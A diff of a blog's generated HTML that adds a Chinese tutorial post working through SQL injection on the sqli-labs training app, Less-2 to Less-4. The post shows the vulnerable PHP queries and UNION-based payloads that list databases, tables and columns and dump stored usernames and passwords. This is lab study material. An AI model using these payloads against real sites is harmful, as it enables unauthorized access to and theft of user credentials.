@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="sql注入,sqli-labs," />
 
 
 
@@ -79,14 +79,18 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="tags">
-<meta property="og:url" content="http://yoursite.com/tags/index.html">
+<meta name="description" content="sqli-labs练习SQL注入（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 手工注入(hackbar)Less-2 GET-Error based-Intiger based基于get请求方法的整形注入根据页面提示可知为数字型参数 id sqli-labs/Less-2/?id=1 页面返回 Welcome    Dhakkan Your">
+<meta name="keywords" content="sql注入,sqli-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs_Less_2-4">
+<meta property="og:url" content="http://yoursite.com/2018/04/19/sqli-labs-Less-2-4/index.html">
 <meta property="og:site_name" content="Ahodor&#39;Via">
+<meta property="og:description" content="sqli-labs练习SQL注入（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 手工注入(hackbar)Less-2 GET-Error based-Intiger based基于get请求方法的整形注入根据页面提示可知为数字型参数 id sqli-labs/Less-2/?id=1 页面返回 Welcome    Dhakkan Your">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-04-19T00:53:06.656Z">
+<meta property="og:updated_time" content="2018-04-19T13:55:07.120Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="tags">
+<meta name="twitter:title" content="sqli-labs_Less_2-4">
+<meta name="twitter:description" content="sqli-labs练习SQL注入（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 手工注入(hackbar)Less-2 GET-Error based-Intiger based基于get请求方法的整形注入根据页面提示可知为数字型参数 id sqli-labs/Less-2/?id=1 页面返回 Welcome    Dhakkan Your">
 
 
 
@@ -116,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/04/19/sqli-labs-Less-2-4/"/>
 
 
 
 
 
-  <title>tags | Ahodor'Via</title>
+  <title>sqli-labs_Less_2-4 | Ahodor'Via</title>
   
 
 
@@ -271,40 +275,200 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/19/sqli-labs-Less-2-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">tags</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <div class="tag-cloud">
-            <div class="tag-cloud-title">
-                3 tags in total
-            </div>
-            <div class="tag-cloud-tags">
-              <a href="/tags/sqli-labs/" style="font-size: 30px; color: #111">sqli-labs</a> <a href="/tags/sqlmap/" style="font-size: 12px; color: #ccc">sqlmap</a> <a href="/tags/sql注入/" style="font-size: 30px; color: #111">sql注入</a>
-            </div>
-          </div>
+          <h1 class="post-title" itemprop="name headline">sqli-labs_Less_2-4</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-19T21:49:16+08:00">
+                2018-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h1 id="sqli-labs练习SQL注入（mysql）"><a href="#sqli-labs练习SQL注入（mysql）" class="headerlink" title="sqli-labs练习SQL注入（mysql）"></a>sqli-labs练习SQL注入（mysql）</h1><p> 漏洞源代码下载：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
+<h2 id="手工注入-hackbar"><a href="#手工注入-hackbar" class="headerlink" title="手工注入(hackbar)"></a>手工注入(hackbar)</h2><h2 id="Less-2-GET-Error-based-Intiger-based"><a href="#Less-2-GET-Error-based-Intiger-based" class="headerlink" title="Less-2 GET-Error based-Intiger based"></a>Less-2 GET-Error based-Intiger based</h2><p>基于get请求方法的整形注入<br>根据页面提示可知为<strong>数字型</strong>参数 <strong>id</strong></p>
+<pre><code>sqli-labs/Less-2/?id=1
+</code></pre><p>页面返回</p>
+<pre><code>Welcome    Dhakkan
+Your Login name:Dumb
+Your Password:Dumb 
+</code></pre><p>添加一个单引号后</p>
+<pre><code>sqli-labs/Less-2/?id=1&apos;
+</code></pre><p>页面返回错误</p>
+<pre><code>Welcome    Dhakkan
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1
+</code></pre><p>从外层逐层去掉闭合单引号发现只剩下一个单引号 ，可以判断为<strong>数字型sql注入</strong>。</p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><pre><code>Less-2/?id=1 %23
+</code></pre><p>数字型直接把后面的注释掉即可</p>
+<pre><code>sqli-labs/Less-2/?id=1 order by 6 %23 报错
+sqli-labs/Less-2/?id=1 order by 5 %23 正常
+sqli-labs/Less-2/?id=-1 union select 1,2,3,4,5 %23 显示位 2，3
+sqli-labs/Less-2/?id=-1 union select 1,version(),database(),4,5 %23 版本：5.5.53 数据库：security
+sqli-labs/Less-2/?id=-1 union select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 返回所有的数据库
+sqli-labs/Less-2/?id=-1 union  select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 返回security数据库的所有表名
+sqli-labs/Less-2/?id=-1 union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 返回users表的所有列名
+sqli-labs/Less-2/?id=-1 union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 返回users表中的username和password字段的值
+</code></pre><p>以上payload与Less-1相似</p>
+<h3 id="字符型注入和数字型注入的区别"><a href="#字符型注入和数字型注入的区别" class="headerlink" title="字符型注入和数字型注入的区别"></a>字符型注入和数字型注入的区别</h3><p>Less-1 字符型 <strong>id=’$id’</strong></p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
+</code></pre><p>Less-2 数字型 <strong>id=$id</strong></p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre><p>加了一个单引号的报错结果</p>
+<pre><code>字符型：&apos;&apos;1&apos;&apos; LIMIT 0,1&apos; 从外逐层去掉成对的单引号 1&apos;
+数字型：&apos;&apos; LIMIT 0,1&apos;  从外逐层去掉成对的单引号 &apos;  
+</code></pre><p>如果没有报错显示：test1不报错,test2报错为字符型</p>
+<pre><code>test1  sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=&apos;2 
+test2  sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=2
+</code></pre><p>对比可知：字符型使用单号包裹，数字型无；加了一个单引号后可以看到提交的参数被单引号包裹；以及上面测试的结果判断。</p>
+<h2 id="Less-3-GET-Error-Single-quotes-with-twist-string"><a href="#Less-3-GET-Error-Single-quotes-with-twist-string" class="headerlink" title="Less-3 GET-Error-Single quotes with twist-string"></a>Less-3 GET-Error-Single quotes with twist-string</h2><h3 id="基于get请求方法的带括号的单引号字符型报错注入"><a href="#基于get请求方法的带括号的单引号字符型报错注入" class="headerlink" title="基于get请求方法的带括号的单引号字符型报错注入"></a>基于get请求方法的带括号的单引号字符型报错注入</h3><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><pre><code>sqli-labs/Less-3/?id=1&apos;
+</code></pre><p>返回</p>
+<pre><code>near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1
+</code></pre><p>分析发现是在 Less-1的基础上加了括号 </p>
+<h4 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h4><pre><code>sqli-labs/Less-3/?id=1&apos;) %23
+</code></pre><p>返回正常,这里看一下源码就更好理解了</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
+</code></pre><h4 id="按照之前的思路测试即可"><a href="#按照之前的思路测试即可" class="headerlink" title="按照之前的思路测试即可"></a>按照之前的思路测试即可</h4><pre><code>sqli-labs/Less-3/?id=1&apos;) order by 6 %23 返回错误
+sqli-labs/Less-3/?id=1&apos;) order by 5 %23 返回正常
+sqli-labs/Less-3/?id=-1&apos;) union all select 1,2,3,4,5 %23 可知 2，3回显
+</code></pre><h2 id="Less-4-Get-Error-based-Double-Quotes-string"><a href="#Less-4-Get-Error-based-Double-Quotes-string" class="headerlink" title="Less-4 Get-Error based- Double Quotes-string"></a>Less-4 Get-Error based- Double Quotes-string</h2><h3 id="基于get请求方法的双引号报错注入"><a href="#基于get请求方法的双引号报错注入" class="headerlink" title="基于get请求方法的双引号报错注入"></a>基于get请求方法的双引号报错注入</h3><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><pre><code>sqli-labs/Less-4/?id=1&apos;
+</code></pre><p>页面正常没有任何异常（这里加了单引号没作用），加一个双引号</p>
+<pre><code>sqli-labs/Less-4/?id=1&quot;
+返回 near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1
+</code></pre><p>从外逐层去掉成对的双引号和单引号 ，我们发现情况与Less-3类似，只是单引号换成双引号。</p>
+<h3 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h3><pre><code>sqli-labs/Less-4/?id=1&quot;) %23
+</code></pre><p>返回正常</p>
+<h3 id="按照之前的思路即可"><a href="#按照之前的思路即可" class="headerlink" title="按照之前的思路即可"></a>按照之前的思路即可</h3><pre><code>sqli-labs/Less-4/?id=1&quot;) order by 6%23
+sqli-labs/Less-4/?id=1&quot;) order by 5%23
+sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3,4,5%23
+</code></pre>
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql注入/" rel="tag"># sql注入</a>
+          
+            <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/19/sqli-labs-Less-1/" rel="next" title="sqli-labs_Less_1">
+                <i class="fa fa-chevron-left"></i> sqli-labs_Less_1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -337,8 +501,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -389,6 +562,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs练习SQL注入（mysql）"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs练习SQL注入（mysql）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#手工注入-hackbar"><span class="nav-number">1.1.</span> <span class="nav-text">手工注入(hackbar)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2-GET-Error-based-Intiger-based"><span class="nav-number">1.2.</span> <span class="nav-text">Less-2 GET-Error based-Intiger based</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#构造payload"><span class="nav-number">1.2.1.</span> <span class="nav-text">构造payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#字符型注入和数字型注入的区别"><span class="nav-number">1.2.2.</span> <span class="nav-text">字符型注入和数字型注入的区别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3-GET-Error-Single-quotes-with-twist-string"><span class="nav-number">1.3.</span> <span class="nav-text">Less-3 GET-Error-Single quotes with twist-string</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于get请求方法的带括号的单引号字符型报错注入"><span class="nav-number">1.3.1.</span> <span class="nav-text">基于get请求方法的带括号的单引号字符型报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#测试"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构造payload-1"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">构造payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#按照之前的思路测试即可"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">按照之前的思路测试即可</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4-Get-Error-based-Double-Quotes-string"><span class="nav-number">1.4.</span> <span class="nav-text">Less-4 Get-Error based- Double Quotes-string</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于get请求方法的双引号报错注入"><span class="nav-number">1.4.1.</span> <span class="nav-text">基于get请求方法的双引号报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造payload-2"><span class="nav-number">1.4.3.</span> <span class="nav-text">构造payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#按照之前的思路即可"><span class="nav-number">1.4.4.</span> <span class="nav-text">按照之前的思路即可</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
